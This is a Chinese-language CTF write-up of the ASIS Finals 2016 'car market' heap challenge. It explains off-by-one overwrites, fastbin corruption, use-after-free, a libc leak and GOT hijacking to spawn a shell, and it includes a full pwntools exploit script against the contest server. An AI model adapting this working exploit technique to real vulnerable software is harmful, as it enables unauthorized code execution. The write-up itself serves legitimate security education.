title: '[ASIS CTF Finals 2016] car market 177'
author: bruce30262
tags:
  - pwn
  - heap
  - ASIS CTF Finals 2016
  - Use After Free
  - fastbin
  - off-by-one
categories:
  - write-ups
date: 2016-09-14 18:16:00
---
## Info  
> Category: pwn  
> Point: 177   
> Solver: bruce30262 @ BambooFox   
> 再次感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 ddaa 幫忙讀 flag XD

## Analyzing  
64 bit ELF, 有 NX, stack guard, Partial RELRO, 沒 PIE
  
程式主要有三個選單。一開始進入第一個選單，我們可以 add car, remove car, list car 跟 select car。select car 之後進入第二個選單，可以選擇印出 car 的 info，設定 car 的資訊以及新增一個 customer。新增 customer 時會進入第三個選單，可以設定 customer 的名字和 comment。

程式主要有兩個 data structure，分別是 `car` 與 `customer`，structure 內容如下:
```c car
struct car{
  char model[16];
  long price;
  struct customer* customer;
};
```
```c customer
struct customer{
  char first_name[32];
  char name[32];
  char* comment; // buffer size: 0x48
};
```
透過一些 reversing 以及 fuzzing，我們可以整理出程式裡面一些較為重要的行為:  

* global data 段會有個 pointer `ptr`，型態為 `struct car**`。程式一開始會 malloc 一塊 buffer 給 `ptr`，之後會拿來存 `car*` 的 array。  
* 在新增一個 `car` 的 customer 的時候，程式會先檢查 `car->customer` 與 `car->customer->comment` 是否存在。如果存在的話會先對這兩塊記憶體做 free，之後重新 malloc 兩塊記憶體給這兩個 data，確保一個 `car` 裡面只會有一個 customer。  
* 程式在處理使用者輸入的時候有存在多個 **off-by-one** 的漏洞。如果在設定 `model`, `first_name` 以及 `name` 的時候，輸入一個較長的字串，我們就有辦法觸發這個漏洞，**造成 structure 中的下一個 data 的第一個 byte 被蓋成 null byte。**  
 


## Exploit  
首先我們要有辦法 leak 一些 address。

首先是 heap 的 address。這部分可以透過以下操作來拿到: 

* 新增 customer，進入選單三  
* 離開選單三
* 再進一次選單三
* 離開選單三並印出 customer 資訊，此時 `customer->first_name` 會是一個 heap 的 address

會這樣是因為我們在第二次進入選單三的時候，程式會檢查到 `car->customer` 與 `car->customer->comment` 的存在，並且會嘗試去 free 這兩塊記憶體。此時 free 完之後，`customer` 這個 chunk 的 fd (**也就是 `customer->first_name` 的位置**) 會被寫成下一個 free chunk 的 address，因此如果這時我們印出 customer 的 first_name，就可以拿到 heap 的 address。

下一個是 libc 的 address。這部分我們可以利用前面提到的 off-by-one 漏洞，搭配 **fastbin corruption** 的方式來做到。方法如下:

假設我們有一個 `car`，它的 `customer` 的 memory layout 長的像這個樣子:
<pre>
             +------------------+
customer     |........first_name| char first_name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+32  |..............name| char name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+64  |        0x12345680| char* comment
             +------------------+ 
</pre>

此時如果我們再輸入一次 `name`，並給一個長度超過 32 的字串的話，我們就可以透過 off-by-one 的漏洞，**將 comment 的 pointer 從 `0x12345680` 改成 `0x12345600`**。之後程式在 free `car->customer->comment` 的時候，就會 free 到一個錯誤的 chunk。如果我們這時又有一個 `car`，它的 memory layout 長這樣:
<pre>
                      +------------------+
    car    0x123455F0 |               0x0| char model[16]
                      +------------------+
                      |              0x51|
                      +------------------+
    car+16 0x12345600 |              0x64| long price
                      +------------------+
    car+24 0x12345608 |        0x12348880| struct customer* customer
                      +------------------+
</pre>

此時我們可以透過設定 `car->model` 來偽造 `0x12345600` 這塊 memory chunk 的 header，讓程式誤以為它是在 free 一個 size 為 0x50 的 memory chunk (size = 0x50，跟 `comment` 的大小一樣)，並將 `0x12345600` 這個 memory chunk 加入 fastbin 裡面。 這麼一來我們就製造了一個 **Use-After-Free** 的情形，其中 `0x12345600` 是我們的 dangling pointer。之後再新增一次 comment 的時候，程式會 malloc `0x12345600` 來當作是 comment 的 buffer。此時，comment 的 buffer 將會和某個 `car` 的 structure 重疊，之後我們就可以藉由更改 comment 來修改 `car` 的 structure。

可以改 `car` structure 之後，我們就可以將 `car->customer` 這個 pointer 改成 `atoi` 的 GOT。之後我們就可以藉由印出 `car->customer->first_name` 來 leak `atoi` 的 GOT，得到 libc 的 address。

因此整理一下 leak libc address 的方法:

1. 先新增幾個 `car`，讓其中一個 `car` 的 address 是以 **0xf0** 做為結尾 (ex. `0x123455f0`)，並在 `car->model` 裡面放上假的 chunk header
2. 利用 off-by-one 漏洞更改某個 customer 的 comment 指標 (ex. `0x12345680` --> `0x12345600`)
3. 離開並重新進入選單三，讓程式可以去 free 更改後的 comment 指標
4. 再新增一個 comment，此時新的 comment buffer 會和其中一個 `car` structure 重疊，因此我們可以藉由更改 comment 的方式來偽造 `car` structure，將 `car->customer` 改成 `atoi` 的 GOT
5. 印出 `car->customer->first_name`，leak `atoi` 的 GOT，得到 libc 的 address

拿到 libc 的 address 之後就可以計算 `system` 的位址 (這題有給 libc.so)。因為這題 GOT 可寫，所以可以嘗試將 `atoi` 的 GOT 改成 `system` 之後 hijack `atoi` 的 GOT。本來一開始我是想用前面的方式來直接改 `atoi` 的 GOT，因為此時 `car->customer` = `atoi@got.plt`，因此我們可以藉由更改 `car->customer->first_name` 的方式來 overwrite GOT 的內容。

只是嘗試這樣做之後發現程式會 crash。原因是因為要進入選單三更改 first_name 時，程式會先嘗試去 free `car->customer`，此時因為這個位置是 `atoi` 的 GOT，因此 `free(atoi@got.plt)` 時會炸掉。**此時，文章前面提到的 `ptr` 變數便派上用場了。**

`ptr` 是一個指向 `car*` array 的 pointer。因為我們現在可以藉由更改 comment 的方式來控制 `car` 的 structure，因此如果我們將 `car->customer` 改成 `ptr`，之後程式在 `free(car->customer)` 的時候就會去 free `ptr`，**我們就可以把整個 `car*` array 給 free 掉**。之後新增 comment 的時候，glibc 會把 `ptr` 的 chunk 做分割，將其中的 0x50 做為新的 buffer 分配給新的 comment。此時透過更改 comment，我們就可以控制一部分的 `car*` array。之後將 `car` 指標改成 `atoi` 的 GOT，我們就可以藉由更改 `car->model` 的方式來覆寫 `atoi` GOT 的內容，達到 hijack GOT 的效果。

將上述方法整理一下:

1. 透過 comment 更改 `car` 的 structure，將 `car->customer` 改成 `ptr`
2. 離開並重新進入選單三，讓程式可以去 free 更改後的  `car->customer`
3. 新增一個 comment，此時新的 comment buffer 會和 `car*` array 重疊，我們可以藉由更改 comment 的方式來控制 `car*` array
4. 將其中一個 car 指標改成 `atoi` 的 GOT，並藉由更改 `car->model` 的方式，將 `atoi` 的 GOT 改成 `system` 的 address，做 GOT hijacking

之後我們在輸入選項時，就可以輸入 `sh\x00`，執行 `system('sh')` 拿 shell。

```python exp_car.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "car-market.asis-ctf.ir"
PORT = 31337
ELF_PATH = "./car_market"
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
LIBC_PATH = "./car_libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def add_car(model, price):
    r.sendlineafter(">\n", "2")
    r.sendlineafter("model\n", model)
    r.sendlineafter("price\n", str(price))

def sel_car_cust(idx, cust_zip):
    r.sendlineafter(">\n", "4")
    r.sendlineafter("index\n", str(idx))
    r.sendlineafter(">\n", "4")

    for (choice, data) in cust_zip:
        r.sendlineafter(">\n", str(choice))
        r.sendlineafter(": \n", data)
    
    r.sendlineafter(">\n", "4") # exit cust mode

def leak_heap(idx):
    r.sendlineafter(">\n", "4")
    r.sendlineafter("index\n", str(idx))
    r.sendlineafter(">\n", "4") # add cust
    r.sendlineafter(">\n", "3") # add com
    r.sendlineafter(": \n", "123") # input com
    r.sendlineafter(">\n", "4") # exit cust
    r.sendlineafter(">\n", "4") # add cust
    r.sendlineafter(">\n", "4") # exit cust
    r.sendlineafter(">\n", "1") # list
    r.recvuntil("Firstname : ")
    heap_base = u64(r.recvline().strip().ljust(8, "\x00")) - 0xb90
    r.sendlineafter(">\n", "5")

    return heap_base

def leak_got(idx):
    r.sendlineafter(">\n", "4")
    r.sendlineafter("index\n", str(idx))
    r.sendlineafter(">\n", "1")
    r.recvuntil("Firstname : ")
    atoi_addr = u64(r.recv(6).ljust(8, "\x00"))
    log.success("atoi_addr: "+hex(atoi_addr))
    libc.address += atoi_addr - libc.symbols['atoi']
    r.sendlineafter(">\n", "5")


if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    for i in xrange(17):
        model = chr(ord("a")+i)*4
        price = 100+i
        log.info("add car: "+str(i))
        if i == 15: # fake chunk
            model = p64(0) + p64(0x51)
            price = 0x1111
        add_car(model, price)

    # leak heap base
    log.info("leaking heap base...")
    heap_base = leak_heap(16)
    log.success("heap_base: "+hex(heap_base))

    # overflow one byte of heap address
    log.info("overflowing heap address...")
    choice = [3, 1]
    data   = ["comment", "A"*33]
    sel_car_cust(16, zip(choice, data))   
    
    # add comment and overwrite customer pointer, change it to atoi@got.plt
    log.info("modifying car 15 struct (for leaking got)...")
    r.sendlineafter(">\n", "4") # add customer
    r.sendlineafter(">\n", "3") # add comment
    r.sendlineafter(": \n", p64(0x1111) + p64(elf.got['atoi']))
    r.sendlineafter(">\n", "4") # exit customer menu
    r.sendlineafter(">\n", "5") # exit select car menu
    
    # leak atoi's got
    log.info("leaking atoi's got & libc base...")
    leak_got(15)
    system = libc.symbols['system']
    log.success("libc base: "+hex(libc.address))
    log.success("system: "+hex(system))

    # overwrite customer pointer to heap_base+0x10
    log.info("modifying car 15 struct (for corrupting car array)...")
    choice = [3]
    data   = [p64(0x1111) + p64(heap_base+0x10)]
    sel_car_cust(16, zip(choice, data))   
    r.sendlineafter(">\n", "5") # exit select car menu

    # free & reallocate heap_base+0x10 , now we can control the car array 
    # after we control the car array, overite car[14] and make it point to atoi's got
    log.info("modifying car array...")
    choice = [3]
    data   = ["A"*0x20+p64(elf.got['atoi'])]
    sel_car_cust(15, zip(choice, data))   
    r.sendlineafter(">\n", "5") # exit select car menu
    
    # overwrite atoi's got
    log.info("overwriting atoi's got...")
    r.sendlineafter(">\n", "4") # select car
    r.sendlineafter("index\n", "14") # input index
    r.sendlineafter(">\n", "2") # set model (atoi's got)
    r.sendlineafter("model\n", p64(system))
    r.sendline("sh\x00")

    log.success("get shell !")
    r.interactive()
```
寫完 exploit 之後拿來跑，然後就 timeout 了... 

傳到 trello 請 Ann Tsai 幫忙跑之後就去睡了，結果醒來時卻發現這題還沒過 @@ 
原來是 Ann Tsai 在拿到 shell 之後找不到 flag ?! 

結果用她的機器進行測試的時候發現 flag 藏在一個頗猥瑣的位置

<pre>
$ ls -la
total 40
drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -> /dev/null
-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
</pre>

看來主辦方是想惡搞我們參賽者。沒關係，cat flag 下一下結束這回合:  
<pre>
$ cat ._flag
cat: ._flag: No such file or directory
</pre>

(☉д⊙).........WTF ?!

主辦方不知道下了什麼巫術，讓我們看到了 flag 檔名卻不讓我們 cat flag 的內容。之後進行了一連串 command line 的嘗試，例如 `for f in .*;do cat $f;done`，不過還是無法讀取。最後是 ddaa 用 `cat .*` 讓 flag 噴出來的......到現在還是匪夷所思.....

flag: `ASIS{a0b8813fc566836c8b5f37fe68c684c5}`